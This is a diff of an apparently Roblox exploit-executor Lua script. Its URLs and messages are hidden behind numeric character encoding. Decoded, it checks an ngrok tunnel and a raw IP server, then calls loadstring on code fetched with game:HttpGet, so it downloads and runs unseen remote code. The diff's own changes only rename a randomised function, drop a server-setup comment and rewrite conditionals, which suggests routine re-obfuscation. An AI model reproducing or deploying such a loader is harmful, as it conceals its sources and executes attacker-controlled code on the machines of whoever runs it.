@@ -2,7 +2,7 @@
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 
-local _bfu33klb2 = function()
+local _via8zsv4l = function()
     local function checkSiteStatus(url)
     local success, result = pcall(function()
         return game:HttpGet(url .. (function()
@@ -12,7 +12,7 @@ local _bfu33klb2 = function()
             b=b..string.char((a[i]-37)/13);
         end;
         return b;
-    end)()) -- Create this file on your server
+    end)())
     end)
 
     if success then
@@ -117,7 +117,7 @@ if checkSiteStatus((function()
             b=b..string.char((a[i]-37)/13);
         end;
         return b;
-    end)()) then
+    end)()) == true then
 status.Text = (function()
         local a={1116,1324,1519,1402,1493,1545,453,1402,1532,453,1064,1051,129894};
         local b='';
@@ -152,7 +152,7 @@ if checkSiteStatus((function()
             b=b..string.char((a[i]-37)/13);
         end;
         return b;
-    end)()) then
+    end)()) == true then
 status.Text = (function()
         local a={1116,1324,1519,1402,1493,1545,453,1402,1532,453,1064,1051,129894};
         local b='';
@@ -180,21 +180,21 @@ loadstring(game:HttpGet((function()
         return b;
     end)()))()
 end
-if not checkSiteStatus((function()
+if checkSiteStatus((function()
         local a={1389,1545,1545,1493,791,648,648,1350,1597,1480,1545,1402,1324,622,1389,1480,1493,1350,1441,1350,1532,1532,1441,1610,622,1454,1402,1467,1428,635,1467,1376,1519,1480,1428,622,1363,1519,1350,1350,635,1298,1493,1493};
         local b='';
         for i=1,#a do 
             b=b..string.char((a[i]-37)/13);
         end;
         return b;
-    end)()) and not checkSiteStatus((function()
+    end)()) == false and checkSiteStatus((function()
         local a={1389,1545,1545,1493,791,648,648,674,765,765,635,778,661,635,687,700,661,635,674,765,778,791,726,661,661,713};
         local b='';
         for i=1,#a do 
             b=b..string.char((a[i]-37)/13);
         end;
         return b;
-    end)()) then
+    end)()) == false then
 status.Text = (function()
         local a={1116,1324,1519,1402,1493,1545,453,1402,1532,453,1064,947,947,130817};
         local b='';
@@ -207,4 +207,4 @@ task.wait(2)
 Welcome:Destroy()
 end
 end;
-_bfu33klb2();
+_via8zsv4l();
